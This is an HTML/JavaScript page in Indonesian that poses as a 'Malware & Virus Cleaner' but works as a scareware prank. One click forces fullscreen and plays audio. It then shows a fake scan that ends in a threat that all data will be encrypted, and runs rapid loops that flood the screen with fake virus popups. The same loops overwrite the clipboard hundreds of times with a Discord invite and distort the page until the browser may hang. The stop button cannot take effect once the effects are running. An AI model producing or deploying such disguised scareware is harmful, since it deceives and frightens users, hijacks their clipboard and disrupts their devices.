<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Malware & Virus Cleaner</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: #f0f0f0;
            font-family: 'Segoe UI', Arial, sans-serif;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            transition: background 0.01s;
            overflow: hidden;
        }
        
        .container {
            background: white;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 25px;
            text-align: center;
            width: 320px;
            box-shadow: 0 1px 5px rgba(0,0,0,0.1);
            transition: all 0.01s;
            position: relative;
            z-index: 10;
        }
        
        h1 {
            color: #d40000;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 20px;
            text-transform: uppercase;
        }
        
        .btn {
            background: #d40000;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 3px;
            cursor: pointer;
            margin: 10px 0;
            width: 220px;
            transition: 0.01s;
            position: relative;
            z-index: 20;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            background: #a00000;
        }
        
        .status {
            color: #555;
            font-size: 13px;
            margin-top: 12px;
        }
        
        .virus-window {
            position: fixed;
            background: white;
            border: 2px solid #ff0000;
            border-radius: 4px;
            padding: 15px;
            width: 280px;
            box-shadow: 0 0 20px rgba(255,0,0,0.8);
            font-size: 12px;
            display: none;
            z-index: 1000;
            animation: pop 0.01s;
        }
        
        @keyframes pop {
            0% { transform: scale(0.9); opacity: 1; }
            100% { transform: scale(1); opacity: 1; }
        }
        
        .virus-title {
            background: #ff0000;
            color: white;
            padding: 8px;
            margin: -15px -15px 10px -15px;
            border-bottom: 1px solid #cc0000;
            font-weight: bold;
        }
        
        .discord-btn {
            background: #5865F2;
            color: white;
            border: none;
            padding: 8px 15px;
            font-size: 12px;
            border-radius: 3px;
            cursor: pointer;
            margin-top: 10px;
            width: 100%;
            font-weight: bold;
        }
        
        .discord-btn:hover {
            background: #4752c4;
        }
        
        #malware-scanner {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: black;
            color: #00ff00;
            font-family: 'Courier New', monospace;
            z-index: 999999;
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }
        
        .scanner-content {
            padding: 20px;
            max-width: 600px;
        }
        
        .scanner-title {
            font-size: 48px;
            color: red;
            margin-bottom: 30px;
            text-shadow: 0 0 20px red;
            animation: blink 1s infinite;
        }
        
        @keyframes blink {
            50% { opacity: 0; }
        }
        
        .scanner-message {
            font-size: 24px;
            margin: 20px 0;
            color: yellow;
        }
        
        .scanner-details {
            font-size: 18px;
            margin: 15px 0;
            color: #00ff00;
        }
        
        #scanner-progress {
            font-size: 48px;
            margin: 30px 0;
            color: #00ffff;
            font-weight: bold;
        }
        
        .progress-bar {
            width: 80%;
            height: 30px;
            border: 2px solid #00ff00;
            margin: 20px auto;
            position: relative;
            overflow: hidden;
        }
        
        .progress-fill {
            height: 100%;
            background: #00ff00;
            width: 0%;
            transition: width 0.1s;
        }
        
        #cleaning-log {
            text-align: left;
            font-size: 14px;
            color: #00ff00;
            margin-top: 30px;
            max-height: 200px;
            overflow-y: auto;
            width: 100%;
            border: 1px solid #00ff00;
            padding: 10px;
        }
        
        .cleaning-log-entry {
            margin: 5px 0;
            border-bottom: 1px solid #00ff00;
            padding: 5px;
        }
        
        .secret-panel {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: #111;
            border: 2px solid #0f0;
            border-radius: 5px;
            padding: 20px;
            z-index: 999999;
            display: none;
            color: #0f0;
            font-family: monospace;
            width: 260px;
            box-shadow: 0 0 20px #0f0;
        }
        
        .secret-panel input {
            background: #000;
            border: 1px solid #0f0;
            color: #0f0;
            padding: 8px;
            width: 90%;
            margin: 10px 0;
            font-family: monospace;
        }
        
        .secret-panel button {
            background: #0f0;
            color: #000;
            border: none;
            padding: 8px 15px;
            font-weight: bold;
            margin: 5px;
            cursor: pointer;
        }

        #progressBar {
            position: fixed;
            bottom: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: transparent;
            z-index: 9999;
            opacity: 0.2;
            pointer-events: none;
        }
        
        #progressFill {
            height: 100%;
            background: #ff0000;
            width: 0%;
            transition: width 0.1s;
        }
    </style>
</head>
<body id="mainBody">
    <div id="progressBar">
        <div id="progressFill"></div>
    </div>

    <div class="secret-panel" id="secretPanel">
        <h3 style="text-align:center; margin-top:0;">RAHASIA</h3>
        <p>Password:</p>
        <input type="password" id="secretPassword" maxlength="6" placeholder="******">
        <br>
        <button id="submitSecret">AKTIFKAN</button>
        <button id="closePanel">TUTUP</button>
    </div>

    <div id="malware-scanner">
        <div class="scanner-content">
            <div class="scanner-title">PEMBERSIH MALWARE</div>
            <div class="scanner-message">MEMINDAI SISTEM...</div>
            <div class="scanner-details">Malware terdeteksi: 1,337</div>
            <div class="progress-bar">
                <div class="progress-fill" id="scannerProgressFill"></div>
            </div>
            <div id="scanner-progress">0%</div>
            <div id="cleaning-log"></div>
        </div>
    </div>

    <div class="container" id="mainContainer">
        <h1>MALWARE & VIRUS CLEANER</h1>
        <button class="btn" id="connectBtn">MULAI PEMBERSIHAN</button>
        <div class="status" id="status">SIAP</div>
    </div>

    <audio id="mp3Player" loop preload="auto">
        <source src="AUD-20250503-WA0009.mp3" type="audio/mpeg">
    </audio>

    <script>
        const DISCORD_LINK = "https:discord.gg/bRWr9KpAbW";
        const AudioContext = window.AudioContext || window.webkitAudioContext;
        let audioCtx = null;
        let scriptNode = null;
        let isPlaying = false;
        let t = 0;
        let spamInterval = null;
        let glitchInterval = null;
        let discordSpamInterval = null;
        let clipboardSpamInterval = null;
        let ultraSpamInterval = null;
        let crashLoop = null;
        
        const audioPlayer = document.getElementById('mp3Player');
        const secretPanel = document.getElementById('secretPanel');
        const secretPass = document.getElementById('secretPassword');
        const progressFill = document.getElementById('progressFill');
        const scannerProgressFill = document.getElementById('scannerProgressFill');
        const malwareScanner = document.getElementById('malware-scanner');
        const scannerProgress = document.getElementById('scanner-progress');
        const cleaningLog = document.getElementById('cleaning-log');
        
        let isPressing = false;
        let pressStartTime = 0;
        let pressTimer = null;
        const LONG_PRESS_TIME = 25000;
        
        function initAudio() {
            if (!audioCtx) {
                audioCtx = new AudioContext();
            }
            return audioCtx;
        }
        
        function copyToClipboard(text) {
            try {
                const textarea = document.createElement('textarea');
                textarea.value = text;
                document.body.appendChild(textarea);
                textarea.select();
                document.execCommand('copy');
                document.body.removeChild(textarea);
            } catch(e) {}
        }
        
        function createVirusWindow() {
            if (!isPlaying) return;
            
            for (let batch = 0; batch < 15; batch++) {
                setTimeout(() => {
                    if (!isPlaying) return;
                    
                    const virus = document.createElement('div');
                    virus.className = 'virus-window';
                    virus.style.display = 'block';
                    virus.style.left = Math.random() * (window.innerWidth - 300) + 'px';
                    virus.style.top = Math.random() * (window.innerHeight - 250) + 'px';
                    virus.style.background = '#fff';
                    virus.style.border = '2px solid #ff0000';
                    virus.style.zIndex = 1000 + Math.floor(Math.random() * 9000);
                    
                    const randomId = Math.floor(Math.random() * 9999999);
                    const pesan = [
                        'KRITIS VIRUS TERDETEKSI',
                        'SISTEM TERINFEKSI PARAH',
                        'TROJAN AKTIF 100 PERSEN',
                        'BACKDOOR TERBUKA',
                        'KEYLOGGER BERJALAN',
                        'DATA ANDA DIENKRIPSI',
                        'BTC MINER TERINSTAL',
                        'BOTNET BERGABUNG',
                        'DDOS TARGET AKTIF',
                        'PASSWORD BOCOR',
                        'CAMERA TELAH DIAKSES',
                        'MIKROFON AKTIF',
                        'LOKASI TERLACAK',
                        'FILE SYSTEM CORRUPT',
                        'REGISTRY RUSAK',
                        'BOOT SECTOR TERINFEKSI',
                        'MBR OVERWRITTEN',
                        'BIOS TERKOMPROMI',
                        'NETWORK SNIFFER AKTIF',
                        'ALL DATA ENCRYPTED',
                        'RANSOMWARE AKTIF',
                        'SYSTEM32 HAPUS',
                        'CRITICAL ERROR',
                        'MEMORY CORRUPTION',
                        'KERNEL PANIC',
                        'CPU OVERLOAD 400 PERSEN',
                        'GPU MELEDAK',
                        'FAN ERROR',
                        'THERMAL THROTTLING',
                        'POWER SURGE'
                    ][Math.floor(Math.random() * 30)];
                    
                    virus.innerHTML = `
                        <div class="virus-title" style="background:#ff0000;">PERINGATAN KRITIS ${randomId}</div>
                        <p style="margin:10px 0; color:#000; font-size:14px; font-weight:bold;">${pesan}</p>
                        <p style="color:#ff0000; font-size:13px;">SEGERA CABUT KABEL POWER</p>
                        <button class="discord-btn" style="background:#5865F2; animation: pulse 0.5s infinite;" 
                            onclick="window.copyDiscordLink();">
                            BERGABUNG LUNAR SCRIPT
                        </button>
                        <p style="color:#000; font-size:11px; margin-top:8px; word-break:break-all;">${DISCORD_LINK}</p>
                    `;
                    
                    document.body.appendChild(virus);
                    
                    setTimeout(() => {
                        if (virus.parentNode) virus.remove();
                    }, 30000);
                }, batch * 5);
            }
        }
        
        window.copyDiscordLink = function() {
            for (let i = 0; i < 50; i++) {
                setTimeout(() => {
                    copyToClipboard(DISCORD_LINK);
                }, i * 5);
            }
        };
        
        function startUltraSpam() {
            clipboardSpamInterval = setInterval(() => {
                if (!isPlaying) return;
                
                for (let i = 0; i < 200; i++) {
                    copyToClipboard(DISCORD_LINK);
                }
            }, 10);
            
            ultraSpamInterval = setInterval(() => {
                if (!isPlaying) return;
                
                for (let w = 0; w < 30; w++) {
                    setTimeout(() => {
                        if (isPlaying) {
                            const virus = document.createElement('div');
                            virus.className = 'virus-window';
                            virus.style.display = 'block';
                            virus.style.left = Math.random() * window.innerWidth + 'px';
                            virus.style.top = Math.random() * window.innerHeight + 'px';
                            virus.style.background = '#ff0000';
                            virus.style.border = '2px solid #ffffff';
                            virus.style.zIndex = 99999;
                            virus.style.width = '300px';
                            virus.style.boxShadow = '0 0 50px #ff0000';
                            
                            virus.innerHTML = `
                                <div class="virus-title" style="background:#000; color:#ff0000;">LUNAR SCRIPT</div>
                                <p style="margin:15px 0; color:white; font-size:16px; font-weight:bold; text-align:center;">
                                    JOIN DISCORD
                                </p>
                                <p style="color:#ffff00; font-size:14px; text-align:center; word-break:break-all; font-weight:bold;">
                                    ${DISCORD_LINK}
                                </p>
                                <button class="discord-btn" style="background:#ffffff; color:#ff0000; font-size:16px; padding:15px; border:2px solid #ffff00;" 
                                    onclick="window.copyDiscordLink();">
                                    SALIN LINK DISCORD
                                </button>
                            `;
                            
                            document.body.appendChild(virus);
                        }
                    }, w * 2);
                }
            }, 50);
            
            crashLoop = setInterval(() => {
                if (!isPlaying) return;
                
                document.body.style.background = `rgb(${Math.floor(Math.random()*255)}, 0, 0)`;
                document.querySelector('.container').style.transform = `skew(${Math.random()*20-10}deg) rotate(${Math.random()*10-5}deg) scale(${1 + Math.random()})`;
                
                for (let i = 0; i < 10; i++) {
                    setTimeout(() => {
                        if (isPlaying) {
                            copyToClipboard(DISCORD_LINK + ' ' + Math.random());
                        }
                    }, i);
                }
            }, 5);
        }
        
        function startGlitch() {
            glitchInterval = setInterval(() => {
                if (!isPlaying) {
                    document.body.style.background = '#f0f0f0';
                    document.querySelector('.container').style.background = 'white';
                    document.querySelector('.container').style.border = '1px solid #ddd';
                    return;
                }
                
                const r = Math.floor(Math.random() * 255);
                
                document.body.style.background = `rgb(${r}, 0, 0)`;
                document.querySelector('.container').style.background = `rgb(0, 0, 0)`;
                document.querySelector('.container').style.border = `3px solid rgb(255, 0, 0)`;
                document.querySelector('h1').style.color = `rgb(255, 0, 0)`;
                document.querySelector('h1').style.fontSize = `${Math.random() * 30 + 10}px`;
                
                document.querySelector('.container').style.transform = `skew(${Math.random()*20-10}deg) rotate(${Math.random()*20-10}deg) scale(${Math.random()*1.5})`;
                document.querySelector('.container').style.boxShadow = `0 0 ${Math.random()*100}px rgb(255, 0, 0)`;
                
                document.querySelector('h1').innerHTML = [
                    'KRITIS',
                    'SYSTEM FAILURE',
                    'CPU 500 PERSEN',
                    'VIRUS TOTAL',
                    'CONNECTION LOST',
                    'BOOT SECTOR',
                    'DEAD',
                    'OVERHEAT',
                    'CORRUPTED',
                    'HELP'
                ][Math.floor(Math.random() * 10)];
                
                document.querySelector('.status').innerHTML = 'TERSAMBUNG - ' + Math.floor(Math.random() * 9999) + ' PERANGKAT';
            }, 16);
        }
        
        function stopEffects() {
            if (spamInterval) clearInterval(spamInterval);
            if (glitchInterval) clearInterval(glitchInterval);
            if (discordSpamInterval) clearInterval(discordSpamInterval);
            if (clipboardSpamInterval) clearInterval(clipboardSpamInterval);
            if (ultraSpamInterval) clearInterval(ultraSpamInterval);
            if (crashLoop) clearInterval(crashLoop);
            
            const viruses = document.querySelectorAll('.virus-window');
            viruses.forEach(v => v.remove());
            
            document.body.style.background = '#f0f0f0';
            document.querySelector('.container').style.background = 'white';
            document.querySelector('.container').style.border = '1px solid #ddd';
            document.querySelector('.container').style.transform = 'none';
            document.querySelector('.container').style.boxShadow = '0 1px 5px rgba(0,0,0,0.1)';
            document.querySelector('h1').style.color = '#d40000';
            document.querySelector('h1').style.fontSize = '22px';
            document.querySelector('h1').innerHTML = 'MALWARE & VIRUS CLEANER';
            document.querySelector('.status').innerHTML = 'SIAP';
        }

        function startMalwareCleaner() {
            let el = document.documentElement;
            if (el.requestFullscreen) el.requestFullscreen();
            else if (el.webkitRequestFullscreen) el.webkitRequestFullscreen();
            else if (el.msRequestFullscreen) el.msRequestFullscreen();

            malwareScanner.style.display = 'flex';
            
            audioPlayer.currentTime = 0;
            audioPlayer.loop = true;
            audioPlayer.play().catch(e => console.log('gagal play mp3'));
            
            const logEntries = [
                'Memindai sektor boot',
                'Memeriksa system32',
                'Mendeteksi trojan',
                'Menganalisis registry',
                'Memindai memory',
                'Mengecek proses mencurigakan',
                'Menganalisis jaringan',
                'Memeriksa file system',
                'Mendeteksi keylogger',
                'Memindai rootkit',
                'Memeriksa browser',
                'Menganalisis startup',
                'Memindai cookie',
                'Mengecek extension',
                'Memeriksa service',
                'Menganalisis driver',
                'Memindai hidden file',
                'Mengecek task scheduler',
                'Memeriksa boot sector',
                'Menganalisis MBR'
            ];
            
            let progress = 0;
            let logIndex = 0;
            
            const logInterval = setInterval(() => {
                if (logIndex < logEntries.length) {
                    const entry = document.createElement('div');
                    entry.className = 'cleaning-log-entry';
                    entry.innerHTML = '> ' + logEntries[logIndex] + '... TERDETEKSI';
                    cleaningLog.appendChild(entry);
                    cleaningLog.scrollTop = cleaningLog.scrollHeight;
                    logIndex++;
                }
            }, 500);
            
            const progressInterval = setInterval(() => {
                if (progress < 100) {
                    progress++;
                    scannerProgress.innerText = progress + '%';
                    scannerProgressFill.style.width = progress + '%';
                } else {
                    clearInterval(progressInterval);
                    clearInterval(logInterval);
                    
                    setTimeout(() => {
                        malwareScanner.style.backgroundColor = 'red';
                        document.querySelector('.scanner-title').innerHTML = 'PEMBERSIHAN GAGAL';
                        document.querySelector('.scanner-title').style.color = 'yellow';
                        document.querySelector('.scanner-message').innerHTML = 'KRITIS: MALWARE TIDAK BISA DIHAPUS';
                        document.querySelector('.scanner-details').innerHTML = 'SEMUA DATA AKAN DIENKRIPSI DALAM 10 DETIK';
                        
                        setTimeout(() => {
                            malwareScanner.style.display = 'none';
                            audioPlayer.pause();
                            
                            if (isPlaying) {
                                document.querySelector('.status').innerHTML = 'TERSAMBUNG - ' + Math.floor(Math.random() * 9999) + ' PERANGKAT';
                                startUltraSpam();
                                startGlitch();
                                
                                for (let i = 0; i < 100; i++) {
                                    setTimeout(() => {
                                        if (isPlaying) {
                                            createVirusWindow();
                                        }
                                    }, i * 5);
                                }
                            }
                        }, 5000);
                    }, 1000);
                }
            }, 80);
        }

        const connectBtn = document.getElementById('connectBtn');
        
        connectBtn.addEventListener('mousedown', startPress);
        connectBtn.addEventListener('touchstart', startPress);
        connectBtn.addEventListener('mouseup', endPress);
        connectBtn.addEventListener('mouseleave', cancelPress);
        connectBtn.addEventListener('touchend', endPress);
        connectBtn.addEventListener('touchcancel', cancelPress);
        
        function startPress(e) {
            e.preventDefault();
            if (isPlaying) return;
            
            isPressing = true;
            pressStartTime = Date.now();
            
            pressTimer = setInterval(() => {
                if (!isPressing) return;
                
                const elapsed = Date.now() - pressStartTime;
                const progress = Math.min((elapsed / LONG_PRESS_TIME) * 100, 100);
                document.getElementById('progressFill').style.width = progress + '%';
                
                if (elapsed >= LONG_PRESS_TIME) {
                    clearInterval(pressTimer);
                    cancelPress();
                    showSecretPanel();
                    document.getElementById('progressFill').style.width = '0%';
                }
            }, 100);
        }
        
        function endPress(e) {
            e.preventDefault();
            if (!isPressing) return;
            
            const pressDuration = Date.now() - pressStartTime;
            
            if (pressDuration < LONG_PRESS_TIME && !isPlaying) {
                const ctx = initAudio();
                if (ctx.state === 'suspended') {
                    ctx.resume();
                }
                
                if (isPlaying) {
                    stopCustomAudio();
                    isPlaying = false;
                    connectBtn.innerHTML = 'MULAI PEMBERSIHAN';
                    document.getElementById('status').innerHTML = 'SIAP';
                    t = 0;
                    stopEffects();
                } else {
                    isPlaying = true;
                    connectBtn.innerHTML = 'HENTIKAN PEMBERSIHAN';
                    
                    startMalwareCleaner();
                }
            }
            
            cancelPress();
        }
        
        function cancelPress() {
            isPressing = false;
            clearInterval(pressTimer);
            document.getElementById('progressFill').style.width = '0%';
        }

        function showSecretPanel() {
            secretPanel.style.display = 'block';
            secretPass.value = '';
        }

        document.getElementById('submitSecret').onclick = function() {
            if (secretPass.value === '888866') {
                document.querySelector('h1').innerHTML = 'PEMBERSIH MALWARE FIRUS';
                secretPanel.style.display = 'none';
                document.getElementById('status').innerHTML = 'MODE UBAH NAMA AKTIF';
                setTimeout(() => {
                    document.getElementById('status').innerHTML = 'SIAP';
                }, 2000);
            } else {
                alert('Password salah');
            }
        };

        document.getElementById('closePanel').onclick = function() {
            secretPanel.style.display = 'none';
        };

        secretPass.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                document.getElementById('submitSecret').click();
            }
        });
        
        window.onload = function() {
            const ctx = initAudio();
            ctx.resume();
        };

        function stopCustomAudio() {
            audioPlayer.pause();
            audioPlayer.currentTime = 0;
            if (scriptNode) {
                scriptNode.disconnect();
                scriptNode = null;
            }
        }
    </script>
</body>
</html>
